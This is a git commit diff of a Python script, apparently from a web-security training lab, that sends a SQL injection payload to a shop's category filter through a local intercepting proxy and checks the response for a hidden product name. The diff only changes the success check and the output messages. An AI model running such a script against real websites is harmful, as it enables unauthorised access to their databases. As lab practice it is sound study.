9fccb0cb3da0cd38bec8bff90b21e57c84bf0bf0
chouayaSaif <saif.chouaya@tbs.u-tunis.tn>
2025-03-31 00:23:49 +0200

    testing for SQL injecction vulnerability in a WHERE clause v3

--- Lab1-Injection-In-WHERE-clause.py
+++ Lab1-Injection-In-WHERE-clause.py
@@ -9,7 +9,8 @@ proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 def exploit_sqli(url, payload):
     uri = '/filter?category='
     r = requests.get(url + uri + payload, verify=False, proxies=proxies)
-    if "Cat Grin" in r.text:
+    print(r.text)
+    if "3D Voice Assistants" in r.text:
         return True
     else:
         return False
@@ -24,6 +25,6 @@ if __name__ == "__main__":
         sys.exit(-1)
 
     if exploit_sqli(url, payload):
-        print("[+] SQL injection successful!")
+        print("SQL injection successful!")
     else:
-        print("[-] SQL injection unsuccessful!")
+        print("SQL injection unsuccessful!")
